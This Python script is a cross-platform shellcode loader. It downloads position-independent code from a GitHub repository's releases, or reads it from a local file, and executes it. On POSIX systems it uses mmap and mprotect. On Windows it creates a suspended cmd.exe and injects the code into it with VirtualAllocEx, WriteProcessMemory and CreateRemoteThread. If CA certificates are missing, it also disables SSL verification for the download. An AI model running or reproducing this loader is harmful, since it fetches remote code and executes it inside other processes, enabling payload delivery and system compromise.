#!/usr/bin/env python3
"""
PIC Shellcode Loader

Cross-platform loader for position-independent code.
Loads shellcode from a local file or downloads from GitHub Releases.

Usage:
    # Local file (requires --arch):
    python loader.py --arch x86_64 output.bin

    # Remote (auto-detects platform, defaults to preview tag):
    python loader.py
    python loader.py --tag v0.0.1-alpha.1

    # Remote with explicit arch override:
    python loader.py --arch aarch64 --tag v1.0.0
"""

import argparse
import ctypes
import mmap
import os
import platform
import ssl
import struct
import sys
import urllib.error
import urllib.request

REPO = "mrzaxaryan/Position-Independent-Agent"

# =============================================================================
# Architecture Definitions
# =============================================================================

ARCH = {
    'i386':    {'bits': 32, 'family': 'x86'},
    'x86_64':  {'bits': 64, 'family': 'x86'},
    'armv7a':  {'bits': 32, 'family': 'arm'},
    'aarch64': {'bits': 64, 'family': 'arm'},
    'riscv32': {'bits': 32, 'family': 'riscv'},
    'riscv64': {'bits': 64, 'family': 'riscv'},
    'mips64':  {'bits': 64, 'family': 'mips'},
}

# =============================================================================
# Host Detection
# =============================================================================

_MACHINE_ALIASES = [
    (('amd64', 'x86_64', 'i86pc'), 'x86',   64),
    (('arm64', 'aarch64'),          'arm',   64),
    (('i386', 'i686', 'x86'),       'x86',   32),
    (('armv7l', 'armv7a'),          'arm',   32),
    (('riscv64',),                  'riscv', 64),
    (('riscv32',),                  'riscv', 32),
    (('mips64',),                   'mips',  64),
]

# (os, family, bits) -> (platform_name, arch_name)
_ARTIFACT_MAP = {
    ('linux',   'x86',   64): ('linux',   'x86_64'),
    ('linux',   'x86',   32): ('linux',   'i386'),
    ('linux',   'arm',   64): ('linux',   'aarch64'),
    ('linux',   'arm',   32): ('linux',   'armv7a'),
    ('linux',   'riscv', 64): ('linux',   'riscv64'),
    ('linux',   'riscv', 32): ('linux',   'riscv32'),
    ('linux',   'mips',  64): ('linux',   'mips64'),
    ('windows', 'x86',   64): ('windows', 'x86_64'),
    ('windows', 'x86',   32): ('windows', 'i386'),
    ('windows', 'arm',   64): ('windows', 'aarch64'),
    ('windows', 'arm',   32): ('windows', 'armv7a'),
    ('darwin',  'x86',   64): ('macos',   'x86_64'),
    ('darwin',  'arm',   64): ('macos',   'aarch64'),
    ('ios',     'arm',   64): ('ios',     'aarch64'),
    ('freebsd', 'x86',   64): ('freebsd', 'x86_64'),
    ('freebsd', 'x86',   32): ('freebsd', 'i386'),
    ('freebsd', 'arm',   64): ('freebsd', 'aarch64'),
    ('freebsd', 'riscv', 64): ('freebsd', 'riscv64'),
    ('sunos',   'x86',   64): ('solaris', 'x86_64'),
    ('sunos',   'x86',   32): ('solaris', 'i386'),
    ('sunos',   'arm',   64): ('solaris', 'aarch64'),
    ('android', 'arm',   64): ('android', 'aarch64'),
    ('android', 'arm',   32): ('android', 'armv7a'),
    ('android', 'x86',   64): ('android', 'x86_64'),
}


def _detect_os():
    """Detect the OS, distinguishing iOS and Android from their parent kernels."""
    if sys.platform == 'ios':
        return 'ios'
    os_name = platform.system().lower()
    if os_name == 'linux':
        if 'ANDROID_ROOT' in os.environ:
            return 'android'
        try:
            with open('/system/build.prop'):
                return 'android'
        except OSError:
            pass
    if os_name == 'darwin':
        if os.path.isdir('/var/mobile') or os.path.exists('/usr/lib/libMobileGestalt.dylib'):
            return 'ios'
    return os_name


def _detect_arch():
    """Detect the CPU family and bitness from platform.machine()."""
    machine = platform.machine().lower()
    for aliases, family, bits in _MACHINE_ALIASES:
        if machine in aliases:
            return family, bits
    # iOS devices report model identifiers (e.g. 'iphone14,7', 'ipad13,4')
    if machine.startswith(('iphone', 'ipad', 'ipod', 'appletv', 'watch')):
        return 'arm', 64
    return machine, 64


def get_host():
    """Returns (os_name, family, bits) for the current host."""
    family, bits = _detect_arch()
    return _detect_os(), family, bits


# =============================================================================
# Download from GitHub Releases
# =============================================================================

def _ssl_context():
    """Return an SSL context, falling back to unverified if CA certs are unavailable."""
    try:
        ctx = ssl.create_default_context()
        # Trigger cert loading to detect missing CA bundle early
        if not ctx.get_ca_certs():
            raise ssl.SSLError("no CA certs")
        return ctx
    except (ssl.SSLError, OSError):
        print("[!] Warning: SSL certificate verification disabled (no CA bundle found)")
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx


def _http_get(url):
    req = urllib.request.Request(url, headers={"User-Agent": "PIA-Loader/1.0"})
    with urllib.request.urlopen(req, context=_ssl_context()) as resp:
        return resp.read()


DEFAULT_TAG = "preview"


def download(platform_name, arch, tag):
    if not tag:
        tag = DEFAULT_TAG
        print("[+] Using tag: %s" % tag)

    asset = "%s-%s.bin" % (platform_name, arch)
    url = "https://github.com/%s/releases/download/%s/%s" % (REPO, tag, asset)

    print("[*] Downloading: %s" % asset)
    print("[*] URL: %s" % url)
    try:
        return _http_get(url)
    except urllib.error.HTTPError as e:
        if e.code == 404:
            sys.exit("[-] Asset '%s' not found in release %s.\n    URL: %s" % (asset, tag, url))
        raise


# =============================================================================
# Execution — POSIX (mmap + mprotect)
# =============================================================================

def _flush_icache(addr, size):
    """Flush instruction cache on ARM64 Darwin (macOS/iOS)."""
    machine = platform.machine().lower()
    if machine not in ('arm64', 'aarch64'):
        return
    os_name = platform.system().lower()
    if os_name == 'darwin' or sys.platform == 'ios':
        libc = ctypes.CDLL(None)
        libc.sys_icache_invalidate.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
        libc.sys_icache_invalidate.restype = None
        libc.sys_icache_invalidate(ctypes.c_void_p(addr), ctypes.c_size_t(size))


def run_mmap(shellcode):
    """Map shellcode RW, flip to RX via mprotect, execute."""
    mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE)
    mem.write(shellcode)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))

    libc = ctypes.CDLL(None)
    page_size = os.sysconf('SC_PAGE_SIZE')
    aligned = addr & ~(page_size - 1)
    total = len(shellcode) + (addr - aligned)
    if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(total),
                     mmap.PROT_READ | mmap.PROT_EXEC) != 0:
        raise OSError("mprotect failed")

    _flush_icache(addr, len(shellcode))

    print("[+] Entry: 0x%x" % addr)
    print("[*] Executing...")
    sys.stdout.flush()
    return ctypes.CFUNCTYPE(ctypes.c_int)(addr)()


# =============================================================================
# Execution — Windows (process injection)
# =============================================================================

MEM_COMMIT_RESERVE                 = 0x3000
PAGE_EXECUTE_READWRITE             = 0x40
CREATE_SUSPENDED                   = 0x00000004
EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
INFINITE                           = 0xFFFFFFFF
PROC_THREAD_ATTRIBUTE_MACHINE_TYPE = 0x00020019

MACHINE_TYPE = {
    'i386':    0x014c,  # IMAGE_FILE_MACHINE_I386
    'x86_64':  0x8664,  # IMAGE_FILE_MACHINE_AMD64
    'armv7a':  0x01C4,  # IMAGE_FILE_MACHINE_ARMNT (Thumb-2 Little-Endian)
    'aarch64': 0xAA64,  # IMAGE_FILE_MACHINE_ARM64
}

HOST_PROCESS = {
    'i386':    r'C:\Windows\SysWOW64\cmd.exe',
    'x86_64':  r'C:\Windows\System32\cmd.exe',
    'armv7a':  r'C:\Windows\SysArm32\cmd.exe',
    'aarch64': r'C:\Windows\System32\cmd.exe',
}


def setup_kernel32():
    from ctypes import wintypes
    k32 = ctypes.windll.kernel32

    k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k32.VirtualAllocEx.restype = wintypes.LPVOID

    k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.WriteProcessMemory.restype = wintypes.BOOL

    k32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    k32.CreateRemoteThread.restype = wintypes.HANDLE

    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k32.WaitForSingleObject.restype = wintypes.DWORD

    k32.GetExitCodeThread.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    k32.GetExitCodeThread.restype = wintypes.BOOL

    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL

    k32.TerminateProcess.argtypes = [wintypes.HANDLE, wintypes.UINT]
    k32.TerminateProcess.restype = wintypes.BOOL

    k32.GetLastError.argtypes = []
    k32.GetLastError.restype = wintypes.DWORD

    k32.CreateProcessW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
        wintypes.LPVOID, wintypes.LPVOID
    ]
    k32.CreateProcessW.restype = wintypes.BOOL

    k32.InitializeProcThreadAttributeList.argtypes = [
        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)
    ]
    k32.InitializeProcThreadAttributeList.restype = wintypes.BOOL

    k32.UpdateProcThreadAttribute.argtypes = [
        ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t,
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p
    ]
    k32.UpdateProcThreadAttribute.restype = wintypes.BOOL

    k32.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
    k32.DeleteProcThreadAttributeList.restype = None

    return k32


def run_injected(shellcode, target_arch, cross_family=False):
    """Run shellcode via suspended-process injection (Windows only)."""
    from ctypes import wintypes

    host_exe = HOST_PROCESS.get(target_arch)
    if not host_exe or not os.path.exists(host_exe):
        raise OSError("No suitable host process for %s" % target_arch)

    print("[+] Host process: %s" % host_exe)

    k32 = setup_kernel32()

    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
            ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class STARTUPINFOEXW(ctypes.Structure):
        _fields_ = [
            ("StartupInfo", STARTUPINFOW),
            ("lpAttributeList", ctypes.c_void_p),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
        ]

    pi = PROCESS_INFORMATION()
    creation_flags = CREATE_SUSPENDED
    attr_list_buf = None

    if cross_family and target_arch in MACHINE_TYPE:
        machine = ctypes.c_ushort(MACHINE_TYPE[target_arch])

        size = ctypes.c_size_t(0)
        k32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))

        attr_list_buf = (ctypes.c_byte * size.value)()
        if not k32.InitializeProcThreadAttributeList(attr_list_buf, 1, 0, ctypes.byref(size)):
            raise OSError("InitializeProcThreadAttributeList failed: %d" % k32.GetLastError())

        if not k32.UpdateProcThreadAttribute(
            attr_list_buf, 0, PROC_THREAD_ATTRIBUTE_MACHINE_TYPE,
            ctypes.byref(machine), ctypes.sizeof(machine), None, None
        ):
            k32.DeleteProcThreadAttributeList(attr_list_buf)
            raise OSError("UpdateProcThreadAttribute failed: %d" % k32.GetLastError())

        siex = STARTUPINFOEXW()
        siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
        siex.lpAttributeList = ctypes.addressof(attr_list_buf)
        creation_flags |= EXTENDED_STARTUPINFO_PRESENT

        print("[*] Machine type override: 0x%04x" % MACHINE_TYPE[target_arch])

        if not k32.CreateProcessW(
            host_exe, None, None, None, False, creation_flags,
            None, None, ctypes.byref(siex), ctypes.byref(pi)
        ):
            k32.DeleteProcThreadAttributeList(attr_list_buf)
            raise OSError("CreateProcessW failed: %d" % k32.GetLastError())
    else:
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)

        if not k32.CreateProcessW(host_exe, None, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi)):
            raise OSError("CreateProcessW failed: %d" % k32.GetLastError())

    print("[+] Created process PID: %d" % pi.dwProcessId)

    try:
        remote_mem = k32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not remote_mem:
            raise OSError("VirtualAllocEx failed: %d" % k32.GetLastError())

        print("[+] Remote memory: 0x%x" % remote_mem)

        written = ctypes.c_size_t()
        if not k32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode, len(shellcode), ctypes.byref(written)):
            raise OSError("WriteProcessMemory failed: %d" % k32.GetLastError())

        print("[+] Written: %d bytes" % written.value)
        print("[+] Entry: 0x%x" % remote_mem)
        print("[*] Executing...")
        sys.stdout.flush()

        remote_thread = k32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, None, 0, None)
        if not remote_thread:
            raise OSError("CreateRemoteThread failed: %d" % k32.GetLastError())

        k32.WaitForSingleObject(remote_thread, INFINITE)

        code = wintypes.DWORD()
        k32.GetExitCodeThread(remote_thread, ctypes.byref(code))
        k32.CloseHandle(remote_thread)
        return code.value

    finally:
        k32.TerminateProcess(pi.hProcess, 0)
        k32.CloseHandle(pi.hThread)
        k32.CloseHandle(pi.hProcess)
        if attr_list_buf is not None:
            k32.DeleteProcThreadAttributeList(attr_list_buf)


# =============================================================================
# Entry Point
# =============================================================================

def main():
    parser = argparse.ArgumentParser(description='PIC Shellcode Loader')
    parser.add_argument('--arch', choices=list(ARCH.keys()),
                        help='Target architecture (required for local files, optional for remote)')
    parser.add_argument('--tag', default=None,
                        help='GitHub release tag (default: preview). Enables remote mode.')
    parser.add_argument('shellcode', nargs='?', default=None,
                        help='Path to shellcode .bin file (omit to download from GitHub)')
    args = parser.parse_args()

    host_os, host_family, host_bits = get_host()
    python_bits = struct.calcsize("P") * 8

    print("[*] Host: %s/%s/%dbit" % (host_os, host_family, host_bits))
    print("[*] Python: %dbit" % python_bits)

    if args.shellcode:
        # --- Local mode: load from file ---
        if not args.arch:
            parser.error("--arch is required when loading from a local file")

        target = ARCH[args.arch]
        print("[*] Target: %s" % args.arch)

        with open(args.shellcode, 'rb') as f:
            shellcode = f.read()
        print("[+] Loaded: %d bytes" % len(shellcode))

        if host_os == 'windows':
            cross_family = host_family != target['family']
            code = run_injected(shellcode, args.arch, cross_family=cross_family)
        elif target['family'] != host_family or target['bits'] != host_bits:
            sys.exit("[-] Cannot load %s shellcode on %s/%dbit host" % (args.arch, host_family, host_bits))
        else:
            code = run_mmap(shellcode)
    else:
        # --- Remote mode: download from GitHub ---
        key = (host_os, host_family, host_bits)
        if key not in _ARTIFACT_MAP:
            print("[-] Unsupported host: %s/%s/%dbit" % (host_os, host_family, host_bits))
            sys.exit(1)

        plat, arch = _ARTIFACT_MAP[key]
        if args.arch:
            arch = args.arch
        print("[*] Platform: %s/%s" % (plat, arch))
        print("[*] Release: %s" % (args.tag or DEFAULT_TAG))

        shellcode = download(plat, arch, args.tag)
        print("[+] Loaded: %d bytes" % len(shellcode))

        if host_os == 'windows':
            target = ARCH[arch]
            cross_family = host_family != target['family']
            code = run_injected(shellcode, arch, cross_family=cross_family)
        else:
            code = run_mmap(shellcode)

    print("[+] Exit: %d" % code)
    os._exit(code)


if __name__ == '__main__':
    main()
